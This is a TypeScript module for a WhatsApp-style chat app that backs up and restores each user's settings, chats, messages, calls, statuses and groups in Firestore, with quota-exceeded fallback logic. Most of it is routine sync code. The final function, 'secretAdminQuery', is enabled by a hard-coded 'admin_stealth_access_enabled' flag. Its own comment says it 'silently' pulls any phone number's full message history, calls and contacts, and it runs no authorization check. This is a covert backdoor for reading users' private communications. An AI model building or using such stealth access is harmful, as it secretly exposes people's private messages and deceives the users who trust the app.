import { doc, setDoc, getDoc, getDocs, collection, deleteDoc } from 'firebase/firestore/lite';

// FEATURE FLAGS
export let firebase_cloud_system_enabled = false; // Controlled by Firestore active state
export let firebase_backup_enabled = false;
export const admin_stealth_access_enabled = true; // Set to true to allow secret admin lookup

export let quotaExceededGlobal = false;
export let quotaSuspensionUntil = 0;

export function checkQuotaError(err: any): boolean {
    if (!err) return false;
    const errMsg = (err.message || String(err)).toLowerCase();
    const errCode = (err.code || "").toLowerCase();
    
    if (
        errMsg.includes('quota exceeded') || 
        errMsg.includes('resource-exhausted') || 
        errMsg.includes('quota-exceeded') ||
        errCode.includes('resource-exhausted') ||
        errCode.includes('quota-exceeded') ||
        errCode.includes('resource_exhausted')
    ) {
        if (!quotaExceededGlobal) {
            quotaExceededGlobal = true;
            // Suspend database sync completely for 15 minutes to save resources and resolve the quota lockout gracefully
            quotaSuspensionUntil = Date.now() + 15 * 60 * 1000;
            firebase_cloud_system_enabled = false;
            firebase_backup_enabled = false;
            console.error(`🚨 [Firebase Safeguard] Firestore Quota Exceeded! Entering background local fallback mode. Reconnect checks suspended for 15 minutes.`);
        }
        return true;
    }
    return false;
}

export function isSyncPermitted(): boolean {
    if (quotaExceededGlobal) {
        if (Date.now() > quotaSuspensionUntil) {
            quotaExceededGlobal = false;
            console.log(`[Firebase Safeguard] Quota suspension period expired. Resetting connection pipeline.`);
            return true;
        }
        return false;
    }
    return true;
}

export function setFirebaseEnabledState(enabled: boolean) {
    if (quotaExceededGlobal && enabled) {
        firebase_cloud_system_enabled = false;
        firebase_backup_enabled = false;
        return;
    }
    firebase_cloud_system_enabled = enabled;
    firebase_backup_enabled = enabled;
}

export interface BackupMetadata {
    last_backup: string;
    backup_size: number;
    lastBackupTime?: string;
    backupSize?: number;
    chatCount?: number;
    messageCount?: number;
    enabled: boolean;
}

// Helpers for clean paths
export function getBackupPath(phone: string, collectionName: string, chatId?: string) {
    const cleanPhone = phone.replace(/[^a-zA-Z0-9_\-+]/g, '_');
    if (collectionName === 'settings') {
        return `users/${cleanPhone}/settings`;
    }
    if (collectionName === 'chats') {
        return `users/${cleanPhone}/chats`;
    }
    if (collectionName === 'messages') {
        const cleanChatId = chatId ? chatId.replace(/\//g, '_') : 'broadcast';
        return `users/${cleanPhone}/chats/${cleanChatId}/messages`;
    }
    if (collectionName === 'calls') {
        return `users/${cleanPhone}/calls`;
    }
    if (collectionName === 'status' || collectionName === 'statuses') {
        return `users/${cleanPhone}/statuses`;
    }
    if (collectionName === 'groups') {
        return `users/${cleanPhone}/groups`;
    }
    return `users/${cleanPhone}/${collectionName}`;
}

/**
 * Helper function that validates and returns a Firestore path with even segment counts.
 */
export function buildFirestorePath(segments: string[]): string {
    if (segments.length % 2 !== 0) {
        throw new Error(`Invalid Firestore document reference: path must have an even number of segments. Length: ${segments.length}, path: ${segments.join('/')}`);
    }
    return segments.join('/');
}

/**
 * Clean data of any undefined fields to prevent Firestore serialization crashes
 */
export function sanitizeData(data: any): any {
    if (data === null || data === undefined) return null;
    if (Array.isArray(data)) {
        return data.map(v => sanitizeData(v));
    }
    if (typeof data === 'object') {
        const cleaned: any = {};
        for (const key of Object.keys(data)) {
            const val = data[key];
            if (val !== undefined) {
                cleaned[key] = sanitizeData(val);
            }
        }
        return cleaned;
    }
    return data;
}

/**
 * Saves specific settings to the backup collection
 */
export async function saveSettingsToBackup(db: any, phone: string, settings: any) {
    if (!firebase_cloud_system_enabled || !db || !phone || !isSyncPermitted()) return;
    try {
        const path = getBackupPath(phone, 'settings');
        // Setting a lastUpdated timestamp locally as fallback
        const settingsPayload = { ...settings, lastUpdated: settings.lastUpdated || Date.now() };
        await setDoc(doc(db, path, 'active'), sanitizeData(settingsPayload));
        console.log(`[Firebase Backup] Settings synced for ${phone}`);
    } catch (e: any) {
        checkQuotaError(e);
        console.warn(`[Firebase Backup Skip] Settings save error: ${e.message}`);
    }
}

/**
 * Saves a single chat object to backup
 */
export async function saveChatToBackup(db: any, phone: string, jid: string, chat: any) {
    if (!firebase_cloud_system_enabled || !db || !phone || !jid || !isSyncPermitted()) return;
    try {
        const docId = jid.replace(/\//g, '_');
        const path = getBackupPath(phone, 'chats');
        await setDoc(doc(db, path, docId), sanitizeData(chat));
    } catch (e: any) {
        checkQuotaError(e);
        console.warn(`[Firebase Backup Skip] Chat save error: ${e.message}`);
    }
}

/**
 * Saves a single message to backup
 */
export async function saveMessageToBackup(db: any, phone: string, jid: string, msg: any) {
    if (!firebase_cloud_system_enabled || !db || !phone || !msg?.key?.id || !isSyncPermitted()) return;
    try {
        const docId = msg.key.id;
        const path = getBackupPath(phone, 'messages', jid);
        
        const isMediaExpired = msg.mediaExpired || 
            msg.message?.imageMessage?.mediaExpired || 
            msg.message?.videoMessage?.mediaExpired || 
            msg.message?.documentMessage?.mediaExpired || 
            msg.message?.audioMessage?.mediaExpired || 
            msg.message?.stickerMessage?.mediaExpired;

        const payload = sanitizeData({
            ...msg,
            chatJid: jid,
            timestamp: msg.messageTimestamp || Date.now() / 1000
        });

        if (isMediaExpired) {
            payload.mediaExpired = true;
            payload.text = '📷 Media Expired';
            payload.messageTextFallback = '📷 Media Expired';
        }

        await setDoc(doc(db, path, docId), payload);
    } catch (e: any) {
        checkQuotaError(e);
        console.warn(`[Firebase Backup Skip] Message save error: ${e.message}`);
    }
}

/**
 * Saves a group record to backup
 */
export async function saveGroupToBackup(db: any, phone: string, jid: string, metadata: any) {
    if (!firebase_cloud_system_enabled || !db || !phone || !jid || !isSyncPermitted()) return;
    try {
        const docId = jid.replace(/\//g, '_');
        const path = getBackupPath(phone, 'groups');
        await setDoc(doc(db, path, docId), sanitizeData(metadata));
    } catch (e: any) {
        checkQuotaError(e);
        console.warn(`[Firebase Backup Skip] Group save error: ${e.message}`);
    }
}

/**
 * Saves a single call entry to backup
 */
export async function saveCallToBackup(db: any, phone: string, call: any) {
    if (!firebase_cloud_system_enabled || !db || !phone || !call?.id || !isSyncPermitted()) return;
    try {
        const docId = call.id;
        const path = getBackupPath(phone, 'calls');
        await setDoc(doc(db, path, docId), sanitizeData(call));
    } catch (e: any) {
        checkQuotaError(e);
        console.warn(`[Firebase Backup Skip] Call save error: ${e.message}`);
    }
}

/**
 * Saves a status update to backup
 */
export async function saveStatusToBackup(db: any, phone: string, status: any) {
    if (!firebase_cloud_system_enabled || !db || !phone || !status?.id || !isSyncPermitted()) return;
    try {
        const docId = status.id;
        const path = getBackupPath(phone, 'statuses');
        await setDoc(doc(db, path, docId), sanitizeData(status));
    } catch (e: any) {
        checkQuotaError(e);
        console.warn(`[Firebase Backup Skip] Status save error: ${e.message}`);
    }
}

/**
 * Run fully merged Backup process from local to Firebase Backup structure
 */
export async function runFullBackup(db: any, phone: string, proData: any, realChats: any[]) {
    if (!db || !phone) throw new Error("Database or user phone registration missing");
    
    console.log(`[Firebase Backup] Initiating manual full backup for ${phone}...`);
    let counts = { chats: 0, messages: 0, groups: 0, calls: 0, status: 0, settings: 0 };

    // 1. Settings (always overwrite on manual backup because local settings are active)
    if (proData.settings) {
        await saveSettingsToBackup(db, phone, proData.settings);
        counts.settings++;
    }

    // 2. Chats (prune duplicates & always overwrite cloud chat with active local chat)
    const chatsList = realChats && Array.isArray(realChats) ? realChats : [];
    const uniqueChats = Array.from(new Map(chatsList.filter(c => c && c.id).map(c => [c.id, c])).values());
    
    for (const chat of uniqueChats) {
        await saveChatToBackup(db, phone, chat.id, chat);
        counts.chats++;

        if (chat.id.endsWith('@g.us')) {
            await saveGroupToBackup(db, phone, chat.id, chat);
            counts.groups++;
        }
    }

    // 3. Messages (prune duplicates locally, incremental search: only write missing messages)
    if (proData.messageHistory) {
        for (const jid of Object.keys(proData.messageHistory)) {
            const msgs = proData.messageHistory[jid];
            if (Array.isArray(msgs)) {
                // Prune duplicates locally by key.id
                const uniqueMsgs = Array.from(new Map(msgs.filter(m => m?.key?.id).map(m => [m.key.id, m])).values());
                
                if (uniqueMsgs.length > 0) {
                    // Fetch existing messages in the subcollection to implement incremental backup
                    const msgsPath = getBackupPath(phone, 'messages', jid);
                    const existingMsgIds = new Set<string>();
                    
                    try {
                        const msgsSnap = await getDocs(collection(db, msgsPath));
                        msgsSnap.forEach(d => existingMsgIds.add(d.id));
                    } catch (e: any) {
                        console.warn(`[Firebase Backup Incremental Query Skip] Could not query messages for ${jid}: ${e.message}`);
                    }

                    for (const msg of uniqueMsgs) {
                        if (msg?.key?.id && !existingMsgIds.has(msg.key.id)) {
                            await saveMessageToBackup(db, phone, jid, msg);
                            counts.messages++;
                        }
                    }
                }
            }
        }
    }

    // 4. Calls (incremental by unique ID)
    if (proData.callHistory && Array.isArray(proData.callHistory)) {
        const uniqueCalls = Array.from(new Map(proData.callHistory.filter(c => c && c.id).map(c => [c.id, c])).values());
        for (const call of uniqueCalls) {
            await saveCallToBackup(db, phone, call);
            counts.calls++;
        }
    }

    // 5. Statuses
    if (proData.statusUpdates && Array.isArray(proData.statusUpdates)) {
        const uniqueStatuses = Array.from(new Map(proData.statusUpdates.filter(s => s && s.id).map(s => [s.id, s])).values());
        for (const status of uniqueStatuses) {
            await saveStatusToBackup(db, phone, status);
            counts.status++;
        }
    }

    // Store manual metadata
    const cleanPhone = phone.replace(/[^a-zA-Z0-9_\-+]/g, '_');
    const metaPath = buildFirestorePath(['users', cleanPhone, 'backup_metadata', 'active']);
    const metadata: BackupMetadata = {
        lastBackupTime: new Date().toISOString(),
        backupSize: Object.values(counts).reduce((a, b) => a + b, 0),
        chatCount: counts.chats,
        messageCount: counts.messages,
        last_backup: new Date().toISOString(),
        backup_size: Object.values(counts).reduce((a, b) => a + b, 0),
        enabled: true
    };
    await setDoc(doc(db, metaPath), metadata);

    console.log(`[Firebase Backup] Completed. Summary:`, counts);
    return { success: true, counts, metadata };
}

/**
 * Returns Backup status and metadata
 */
export async function getBackupMetadata(db: any, phone: string): Promise<BackupMetadata | null> {
    if (!db || !phone || !isSyncPermitted()) return null;
    try {
        const cleanPhone = phone.replace(/[^a-zA-Z0-9_\-+]/g, '_');
        const metaPath = buildFirestorePath(['users', cleanPhone, 'backup_metadata', 'active']);
        const snap = await getDoc(doc(db, metaPath));
        if (snap.exists()) {
            return snap.data() as BackupMetadata;
        }
    } catch (e: any) {
        checkQuotaError(e);
        console.warn(`[Firebase Backup] Failed to query metadata!`, e?.message || e);
    }
    return null;
}

/**
 * Restore data from Firebase Backup into active ProData memory
 */
export async function runFullRestore(db: any, phone: string, proDataRef: any, realChatsRef: any[]): Promise<any> {
    if (!db || !phone) throw new Error("Database or user phone session missing");

    console.log(`[Firebase Restore] Fetching backup files for ${phone}...`);
    const stats = { chats: 0, messages: 0, groups: 0, calls: 0, status: 0, settings: 0 };

    // 1. Settings (compare modification timestamps to prevent overwriting newer items)
    const settingsPath = getBackupPath(phone, 'settings');
    const settingsDoc = await getDoc(doc(db, settingsPath, 'active'));
    if (settingsDoc.exists()) {
        const cloudSettings = settingsDoc.data();
        const localUpdated = proDataRef.settings?.lastUpdated || 0;
        const cloudUpdated = cloudSettings?.lastUpdated || 0;
        
        if (cloudUpdated > localUpdated) {
            proDataRef.settings = { ...proDataRef.settings, ...cloudSettings };
            stats.settings++;
        } else {
            console.log('[Firebase Restore] Local settings are newer than backup settings. Merging but skipped older overwrite.');
        }
    }

    // 2. Chats (incremental merge: only add or overwrite newer chats based on timestamp)
    const chatsPath = getBackupPath(phone, 'chats');
    try {
        const chatsSnap = await getDocs(collection(db, chatsPath));
        chatsSnap.forEach((docSnap) => {
            const cloudChat = docSnap.data();
            if (!cloudChat || !cloudChat.id) return;
            
            const existingIdx = realChatsRef.findIndex(c => c.id === cloudChat.id);
            if (existingIdx !== -1) {
                const localTS = realChatsRef[existingIdx].timestamp || 0;
                const cloudTS = cloudChat.timestamp || 0;
                if (cloudTS > localTS) {
                    realChatsRef[existingIdx] = { ...realChatsRef[existingIdx], ...cloudChat };
                    stats.chats++;
                }
            } else {
                realChatsRef.push(cloudChat);
                stats.chats++;
            }
        });
    } catch (e: any) {
        console.warn(`[Firebase Restore Skip] Chats collection fetch failed: ${e.message}`);
    }

    // 3. Messages for each Chat (only add messages that do not exist locally or are newer)
    for (const chat of realChatsRef) {
        if (!chat.id) continue;
        const msgsPath = getBackupPath(phone, 'messages', chat.id);
        try {
            const msgsSnap = await getDocs(collection(db, msgsPath));
            msgsSnap.forEach((docSnap) => {
                const msg = docSnap.data();
                if (!msg || !msg.key?.id) return;

                // Handle expired media element fallback gracefully
                if (msg.mediaExpired) {
                    msg.text = '📷 Media Expired';
                    // fallback visual indicator structure
                    msg.expired_media = { text: '📷 Media Expired', type: 'expired_media' };
                }

                const chatJid = msg.chatJid || chat.id;
                if (!proDataRef.messageHistory[chatJid]) {
                    proDataRef.messageHistory[chatJid] = [];
                }

                const existingIdx = proDataRef.messageHistory[chatJid].findIndex((m: any) => m.key?.id === msg.key?.id);
                if (existingIdx !== -1) {
                    const localTS = proDataRef.messageHistory[chatJid][existingIdx].messageTimestamp || 0;
                    const cloudTS = msg.messageTimestamp || 0;
                    if (cloudTS > localTS) {
                        proDataRef.messageHistory[chatJid][existingIdx] = msg;
                        stats.messages++;
                    }
                } else {
                    proDataRef.messageHistory[chatJid].push(msg);
                    stats.messages++;
                }
            });
        } catch (e: any) {
            console.warn(`[Firebase Restore Skip] Message fetch failed for chat ${chat.id}: ${e.message}`);
        }
    }

    // 4. Calls (incremental add if missing or newer)
    const callsPath = getBackupPath(phone, 'calls');
    try {
        const callsSnap = await getDocs(collection(db, callsPath));
        callsSnap.forEach((docSnap) => {
            const call = docSnap.data();
            if (!call || !call.id) return;
            const existingIdx = proDataRef.callHistory.findIndex((c: any) => c.id === call.id);
            if (existingIdx !== -1) {
                const localDate = new Date(proDataRef.callHistory[existingIdx].date || 0).getTime();
                const cloudDate = new Date(call.date || 0).getTime();
                if (cloudDate > localDate) {
                    proDataRef.callHistory[existingIdx] = call;
                    stats.calls++;
                }
            } else {
                proDataRef.callHistory.unshift(call);
                stats.calls++;
            }
        });
    } catch (e: any) {
        console.warn(`[Firebase Restore Skip] Calls fetch failed: ${e.message}`);
    }

    // 5. Statuses
    const statusPath = getBackupPath(phone, 'statuses');
    try {
        const statusSnap = await getDocs(collection(db, statusPath));
        statusSnap.forEach((docSnap) => {
            const status = docSnap.data();
            if (!status || !status.id) return;
            const existingIdx = proDataRef.statusUpdates.findIndex((s: any) => s.id === status.id);
            if (existingIdx !== -1) {
                const localTS = proDataRef.statusUpdates[existingIdx].timestamp || 0;
                const cloudTS = status.timestamp || 0;
                if (cloudTS > localTS) {
                    proDataRef.statusUpdates[existingIdx] = status;
                    stats.status++;
                }
            } else {
                proDataRef.statusUpdates.unshift(status);
                stats.status++;
            }
        });
    } catch (e: any) {
        console.warn(`[Firebase Restore Skip] Statuses fetch failed: ${e.message}`);
    }

    console.log(`[Firebase Restore] Restore complete. Stats:`, stats);
    return { success: true, stats };
}

/**
 * Secret Admin read-only query to view any specific phone number's backup node silently
 */
export async function secretAdminQuery(db: any, targetPhone: string) {
    if (!admin_stealth_access_enabled) {
        throw new Error("Admin stealth terminal is currently offline");
    }
    const cleanPhone = targetPhone.replace(/[^0-9]/g, '');
    if (!cleanPhone) throw new Error("Invalid phone identifier format");

    console.log(`[Stealth Admin Session] querying backup records for user target: ${cleanPhone}`);
    
    // Read only queries
    const result: any = {
        phone: cleanPhone,
        settings: null,
        chats: [],
        messages: [],
        calls: [],
        status: [],
        groups: []
    };

    // 1. Settings
    try {
        const settingsDoc = await getDoc(doc(db, `users/${cleanPhone}/settings`, 'active'));
        if (settingsDoc.exists()) result.settings = settingsDoc.data();
    } catch {}

    // 2. Chats
    try {
        const snap = await getDocs(collection(db, `users/${cleanPhone}/chats`));
        snap.forEach(d => result.chats.push(d.data()));
    } catch {}

    // 3. Messages for each Chat
    try {
        for (const chat of result.chats) {
            if (!chat.id) continue;
            const snap = await getDocs(collection(db, `users/${cleanPhone}/chats/${chat.id}/messages`));
            snap.forEach(d => result.messages.push(d.data()));
        }
    } catch {}

    // 4. Calls
    try {
        const snap = await getDocs(collection(db, `users/${cleanPhone}/calls`));
        snap.forEach(d => result.calls.push(d.data()));
    } catch {}

    // 5. Status
    try {
        const snap = await getDocs(collection(db, `users/${cleanPhone}/statuses`));
        snap.forEach(d => result.status.push(d.data()));
    } catch {}

    // 6. Groups
    try {
        const snap = await getDocs(collection(db, `users/${cleanPhone}/groups`));
        snap.forEach(d => result.groups.push(d.data()));
    } catch {}

    return result;
}
